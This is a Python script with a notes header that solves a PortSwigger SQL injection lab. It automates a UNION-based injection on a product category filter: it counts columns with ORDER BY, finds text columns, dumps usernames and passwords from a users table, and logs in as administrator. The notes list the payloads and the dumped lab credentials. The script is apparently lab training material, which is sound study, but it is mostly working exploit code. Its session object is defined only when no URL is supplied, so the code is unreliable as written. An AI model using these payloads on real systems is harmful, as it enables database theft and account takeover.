'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

1. Vulnerability:  Product Category FIlter (SQLi)

2. Goal: 1. Determine the Table that contains User Info
         2. Determine the columns of the relevant table
         3. Output the usernames and passwords from the users table
         4. Login as Administrator user (Final Goal)

3 Analysis: 1. Find The Number of Columns (' ORDER BY 1--)
                - 2 columns (Error in 'ORDER BY 3--)
            
            2. Find the Data Types of the Columns (' UNION SELECT 'a', 'a'--)
                - Both Columns Accept Data type TEXT
            
            3. Printing the usernames and Passwords from users table (' UNION SELECT username, password FROM users--)
            {carlos:bwg3dlltgx1a6zjy7tz6, wiener:zax2fbf9aqwvir0mxvdz, administrator:d4yum1qtwfwy8p4eak78}
            
4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-05/sqli-lab-05.py

'''


import requests
from bs4 import BeautifulSoup
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper to send the payload and get the response
def payload_sender(url, uri, payload):
    try:
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri + payload, verify=False)
    return r.text

# Find the number of columns by using 'ORDER BY'
def exploit_sqli(url):
    uri = '/filter?category=Gifts'
    try:
        r = requests.get(url + uri, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri, verify=False)

    print("-"*40+"\n[*] Way 2: Using Order BY Command")
    
    count = 1
    while True:
        payload_orderby = f"' ORDER BY {count}--"
        r = payload_sender(url, uri, payload_orderby)
        print(f"Tried the count value -> {count}")
        print(f"Way 2: Payload -> {payload_orderby}")

        if "Internal Server Error" in r:
            print(f"[-] Error found at column {count}, returning count - 1.")
            return count - 1
        else:
            count += 1

# Check for text-accepting columns and store them
def exploit_vulnerability(url, uri, num_columns):
    text_columns = []
    
    for i in range(1, num_columns + 1):
        # Build a UNION SELECT payload and test each column with a string 'a'
        payload_list = ['NULL'] * num_columns
        payload_list[i - 1] = "'a'"
        payload_union = "' UNION SELECT " + ','.join(payload_list) + "--"
        
        print(f"Trying Payload for Column {i}: {payload_union}")
        r = payload_sender(url, uri, payload_union)

        if "Internal Server Error" not in r:
            print(f"[+] Column {i} accepts TEXT data.")
            text_columns.append(i)  # Store the column index that accepts TEXT
            
    return text_columns  # Return list of text-accepting columns

#Function to get csrf token    
def get_csrf_token(s, url):
    try:
        r = s.get(url, verify=False, proxies=proxies)
    except: 
        r = s.get(url, verify=False)

    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

# Function to log in as administrator
def login_admin(s, url_login, admin_password):
    csrf = get_csrf_token(s, url_login)
    data = {"csrf": csrf,
            "username": "administrator",
            "password": admin_password}
    try:
        r = s.post(url_login, data=data, verify=False, proxies=proxies)
    except:
        r = s.post(url_login, data=data, verify=False)

    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

# New function to send the secret to the column that accepts TEXT
def solve_lab(url):
    uri = '/filter?category=Gifts'

    # Step 1: Find the number of columns using the ORDER BY approach
    num_columns = exploit_sqli(url)
    if not num_columns:
        print("[-] Unable to find the number of columns!")
        return
    
    print(f"[+] The Number of column(s) are {num_columns}")
    
    # Step 2: Find the columns that accept TEXT
    text_column_indices = exploit_vulnerability(url, uri, num_columns)
    if len(text_column_indices) < 2:
        print("[-] Could not find two columns that accept TEXT!")
        return

    # Step 3: Retrieve usernames and passwords
    payload = f"' UNION SELECT username, password FROM users --"
    r = payload_sender(url, uri, payload)
    
    soup = BeautifulSoup(r, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        
    if admin_password:
        print("[+] The administrator password is: %s " % admin_password)
        # Step 4: Log in as Administrator
        if login_admin(s, url+"/login", admin_password):
            print("[+] SQL injection successful!, Logged In as Administrator :)")
        else:
            print("[-] SQL injection unsuccessful!")    
    else:
        print("[-] Failed to retrieve administrator credentials.")

# Main function
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Edit The url
        url = 'https://0a5400d704537b9182546fde00bc0041.web-security-academy.net'  # Update Domain here
        s=requests.Session()

    solve_lab(url)
